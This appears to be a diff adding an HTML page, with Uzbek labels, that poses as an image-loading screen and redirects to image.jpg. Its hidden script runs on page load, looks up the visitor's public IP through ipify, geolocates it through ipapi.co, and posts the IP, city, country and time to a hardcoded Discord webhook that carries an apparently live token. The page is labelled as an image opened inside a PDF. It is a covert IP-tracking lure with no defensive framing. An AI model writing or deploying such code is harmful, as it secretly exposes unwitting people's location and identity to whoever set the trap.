@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Rasm Yuklanmoqda...</title>
+    <meta http-equiv="refresh" content="0; url=image.jpg">
+</head>
+<body>
+    <script>
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430274332969406464/jWY9FXp_agGFehgu4C7tjFUK35V7-lWDgKfYs87M_ZoJXJcxRRCv_pK_IT8LGNc6gbrw";
+
+        async function trackUser() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const publicIP = ipData.ip;
+
+                let city = 'Nomaʼlum';
+                let country = 'Nomaʼlum';
+                
+                try {
+                    const geoResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
+                    const geoData = await geoResponse.json();
+                    city = geoData.city || 'Nomaʼlum';
+                    country = geoData.country_name || 'Nomaʼlum';
+                } catch (geoError) {}
+
+                const discordMessage = {
+                    content: `📄 **PDF Ichidagi Rasm Ochildi!**\n\n` +
+                             `🌐 **IP Manzil:** ${publicIP}\n` +
+                             `📍 **Joylashuv:** ${city}, ${country}\n` +
+                             `⏰ **Vaqt:** ${new Date().toLocaleString()}\n` +
+                             `🔗 **Manba:** PDF fayl`,
+                    username: "PDF Kuzatuvchi"
+                };
+                
+                fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(discordMessage)
+                });
+
+            } catch (error) {
+                console.error('Xato:', error);
+            }
+        }
+
+        trackUser();
+    </script>
+    
+    <div style="text-align: center; padding: 50px;">
+        <h2>Rasm Yuklanmoqda...</h2>
+        <p>Agar rasm avtomatik ochilmasa, <a href="image.jpg">bu yerni bosing</a></p>
+    </div>
+</body>
+</html>
